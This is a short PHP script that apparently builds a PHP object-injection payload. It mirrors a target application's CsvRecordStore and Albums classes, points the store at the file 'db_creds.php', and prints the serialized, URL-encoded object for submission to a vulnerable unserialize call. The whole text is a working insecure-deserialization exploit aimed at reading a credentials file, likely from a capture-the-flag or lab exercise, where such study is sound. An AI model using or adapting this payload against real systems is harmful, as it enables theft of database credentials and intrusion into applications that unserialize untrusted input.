<?php

class CsvRecordStore 
{
    private $file;

    public function __construct($file) {
        $this->file = $file;
    }
}
class Albums {
    private $store;

    public function __construct($store) {
        $this->store = $store;
    }
}
$a = new Albums(new CsvRecordStore("db_creds.php"));
$b = urlencode(serialize($a));
echo $b;
?>